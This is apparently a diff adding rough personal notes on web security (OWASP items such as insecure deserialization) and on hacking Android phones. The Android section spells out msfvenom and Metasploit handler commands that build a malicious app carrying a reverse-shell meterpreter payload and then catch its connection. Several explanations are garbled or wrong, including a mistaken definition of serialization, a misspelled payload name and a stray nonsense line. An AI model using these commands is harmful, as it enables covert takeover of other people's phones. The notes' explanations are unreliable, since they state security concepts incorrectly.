@@ -1,0 +1,50 @@
+Insecure deserialization
+data sent to the web sever is converted into objects and sent sequentially called serialized objects
+it is deserialized at the server end
+
+Serializtion is the process used to only show cookie in the url and not the paramters 
+
+password are stored in hash format in the data basesd
+
+attacker captures the packet containing the user priviliges adn changes them to get the admin access 
+
+attacker escalates from normal user access to admin access
+atttacker can also perform DOS and DDOS attacks
+
+Using components and known vulns:
+the frameworks or libraries or features usde by developer even though that particular component has a  vuln , that leads to an attack by the attacker
+
+
+Insufficient logging or monitoring:
+not properly logging all the neccessary information in the logs can gives the hacker an additional benefit in the process of maintaining access and clearing tracks
+hacky hack hack folder fo apple server
+
+https://www.bbc.com/news/technology-45219895
+
+open web application security project OWASP
+
+***** HACKING MOBILE PLATFORMS *******
+android
+
+this attck works only in the local network
+
+kali linux:
+tools
+MSFVENOM : metasploit framework venom
+venom creates malicious apps
+
+commad : msfvenom -p android/merterpreter/reverse_tcp LHOST=<kali linux ipaddr> LPORT=4444 R > <appname>
+
+for msf console :
+command: msfconsole
+
+we have to create a folder to handle the tcp requests
+command : use exploit/multi/handler
+
+then we have to set the payload :
+command : set payload android/meterpreter/reverse_tcp
+
+then we have to set the kali linux ipaddr as LHOST
+command : set LHOST 10.0.2.15
+
+ 
